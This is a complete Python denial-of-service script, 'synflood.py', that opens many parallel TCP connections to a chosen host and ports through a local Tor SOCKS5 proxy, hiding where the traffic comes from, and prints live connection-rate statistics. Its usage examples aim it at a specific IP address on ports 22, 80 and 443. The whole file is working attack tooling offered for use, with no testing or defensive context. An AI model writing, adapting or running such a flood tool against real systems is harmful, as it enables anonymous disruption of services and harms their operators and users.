#!/usr/bin/env python3
"""
synflood.py — TCP connection flood via Tor SOCKS5 directly. No torify needed.

Usage:
  python3 synflood.py --target 104.236.68.226 --port 22 --threads 50
  python3 synflood.py --target 104.236.68.226 --port 22,80,443 --threads 20
"""

import argparse
import threading
import time
import signal
import sys

try:
    import socks
except ImportError:
    sys.exit("PySocks required: pip3 install pysocks")

stop = False
lock = threading.Lock()
stats = {"total": 0, "ok": 0, "rst": 0, "tmo": 0, "err": 0}

def connect_one(target, port, tor_port):
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, "127.0.0.1", tor_port)
    s.settimeout(10)
    try:
        s.connect((target, port))
        s.close()
        return "ok"
    except socks.GeneralProxyError:
        return "err"
    except ConnectionRefusedError:
        return "rst"
    except Exception:
        return "tmo"
    finally:
        try:
            s.close()
        except Exception:
            pass

def worker(target, ports, tor_port):
    global stop
    while not stop:
        for p in ports:
            if stop:
                return
            result = connect_one(target, p, tor_port)
            with lock:
                stats["total"] += 1
                stats[result] += 1

ap = argparse.ArgumentParser()
ap.add_argument("--target", required=True)
ap.add_argument("--port", default="22")
ap.add_argument("--threads", type=int, default=20)
ap.add_argument("--tor-port", type=int, default=9050)
args = ap.parse_args()

ports = [int(p) for p in args.port.split(",")]

signal.signal(signal.SIGINT, lambda s, f: globals().update(stop=True))

print(f"TCP flood via Tor SOCKS5 (127.0.0.1:{args.tor_port})")
print(f"Target: {args.target}  Ports: {ports}  Threads: {args.threads}")
print(f"Ctrl+C to stop\n")

threads = []
for i in range(args.threads):
    t = threading.Thread(target=worker, args=(args.target, ports, args.tor_port), daemon=True)
    t.start()
    threads.append(t)

t0 = time.time()
last = 0
try:
    while not stop:
        time.sleep(2)
        elapsed = time.time() - t0
        with lock:
            total = stats["total"]
            ok = stats["ok"]
            rst = stats["rst"]
            tmo = stats["tmo"]
            err = stats["err"]
        cps = (total - last) / 2
        last = total
        print(f"  {total} conns  {cps:.0f} cps  ok={ok} rst={rst} tmo={tmo} err={err}  {elapsed:.0f}s", flush=True)
except KeyboardInterrupt:
    stop = True

elapsed = time.time() - t0
print(f"\nDone: {stats['total']} conns in {elapsed:.1f}s")
print(f"ok={stats['ok']} rst={stats['rst']} tmo={stats['tmo']} err={stats['err']}")
